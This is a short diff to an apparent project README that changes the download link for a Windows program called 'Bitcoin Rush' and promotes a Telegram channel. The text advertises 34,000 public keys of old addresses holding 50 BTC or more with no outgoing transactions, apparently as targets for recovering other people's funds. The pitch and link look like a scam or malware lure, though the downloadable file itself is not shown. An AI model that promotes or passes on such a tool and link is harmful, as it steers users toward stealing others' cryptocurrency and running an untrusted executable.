@@ -4,7 +4,7 @@
 https://t.me/cryptohunt222
 
 
-New version of Bitcoin Rush: [Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/Mnemonic-seed-generator-BIP-32-BIP-44-BIP-84/releases/download/1.1/BitcoinRush-setup-x64.exe)
+New version of Bitcoin Rush: [Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/BitcoinRush/releases/download/1.1/BitcoinRush-setup-x64.zip)
 
 
 34 000 public keys from old addresses with 50 BTC and more (doesn't exist outgoing transactions)!
